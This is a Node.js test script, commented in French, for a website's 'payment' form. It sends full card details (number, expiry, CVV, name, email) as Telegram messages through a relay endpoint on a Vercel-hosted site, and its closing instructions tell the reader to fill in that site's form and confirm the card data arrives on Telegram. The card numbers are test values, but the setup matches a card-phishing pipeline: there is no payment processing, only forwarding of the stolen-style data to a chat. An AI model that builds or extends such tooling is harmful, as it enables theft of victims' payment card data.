const fetch = require('node-fetch');

console.log('💳 TEST MANUEL DE PAIEMENT');
console.log('==========================');

const CONFIG = {
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram'
};

// Fonction pour simuler un paiement manuel
async function simulateManualPayment() {
    try {
        console.log('🧪 Simulation d\'un paiement manuel...');
        
        const paymentData = {
            customerName: 'Jean Dupont',
            email: 'jean.dupont@example.com',
            cardNumber: '4111 1111 1111 1111',
            expiry: '12/25',
            cvv: '123',
            amount: '99.99'
        };
        
        const paymentMessage = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
📅 Expiration: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Paiement simulé avec succès !');
            console.log(`📱 Message ID: ${result.telegramResponse?.result?.message_id}`);
            console.log('📱 Vérifiez votre Telegram - le message devrait y être !');
            
            // Afficher le message
            console.log('\n📄 MESSAGE ENVOYÉ :');
            console.log('='.repeat(50));
            console.log(paymentMessage);
            console.log('='.repeat(50));
            
            return true;
        } else {
            console.log(`❌ Erreur simulation paiement: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur simulation paiement: ${error.message}`);
        return false;
    }
}

// Fonction pour tester différents types de paiements
async function testDifferentPayments() {
    const payments = [
        {
            name: 'Paiement Standard',
            data: {
                customerName: 'Marie Martin',
                email: 'marie.martin@example.com',
                cardNumber: '5555 5555 5555 4444',
                expiry: '06/26',
                cvv: '456',
                amount: '149.99'
            }
        },
        {
            name: 'Paiement Premium',
            data: {
                customerName: 'Pierre Durand',
                email: 'pierre.durand@example.com',
                cardNumber: '4000 0000 0000 0002',
                expiry: '03/27',
                cvv: '789',
                amount: '299.99'
            }
        },
        {
            name: 'Paiement Test',
            data: {
                customerName: 'Test User',
                email: 'test@example.com',
                cardNumber: '4242 4242 4242 4242',
                expiry: '12/25',
                cvv: '123',
                amount: '50.00'
            }
        }
    ];
    
    console.log('🧪 Test de différents types de paiements...\n');
    
    for (let i = 0; i < payments.length; i++) {
        const payment = payments[i];
        console.log(`${i + 1}. ${payment.name}`);
        
        const paymentMessage = `💰 ${payment.name.toUpperCase()} !
👤 Nom: ${payment.data.customerName}
📧 Email: ${payment.data.email}
💳 Carte: ${payment.data.cardNumber}
📅 Expiration: ${payment.data.expiry}
🔐 CVV: ${payment.data.cvv}
💶 Montant: ${payment.data.amount}€
🔒 Vérifiez immédiatement !`;

        try {
            const response = await fetch(CONFIG.TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: paymentMessage,
                    type: 'payment'
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                console.log(`   ✅ Envoyé (ID: ${result.telegramResponse?.result?.message_id})`);
            } else {
                console.log(`   ❌ Erreur: ${result.error}`);
            }
        } catch (error) {
            console.log(`   ❌ Erreur: ${error.message}`);
        }
        
        // Attendre 2 secondes entre chaque paiement
        if (i < payments.length - 1) {
            console.log('   ⏳ Attente de 2 secondes...');
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    }
}

// Fonction principale
async function main() {
    const args = process.argv.slice(2);
    
    if (args.includes('--multiple')) {
        await testDifferentPayments();
    } else {
        await simulateManualPayment();
    }
    
    console.log('\n💡 Instructions pour tester sur votre site :');
    console.log('1. Ouvrez https://test-alpha-lac-68.vercel.app');
    console.log('2. Videz le cache (Ctrl+F5 ou Cmd+Shift+R)');
    console.log('3. Remplissez le formulaire de paiement');
    console.log('4. Cliquez sur "Payer"');
    console.log('5. Vérifiez que le message arrive sur Telegram');
    console.log('\n🔧 Si ça ne marche pas :');
    console.log('- Ouvrez la console (F12) et regardez les erreurs');
    console.log('- Vérifiez que JavaScript est activé');
    console.log('- Essayez dans un autre navigateur');
}

// Exécuter
main().catch(console.error);
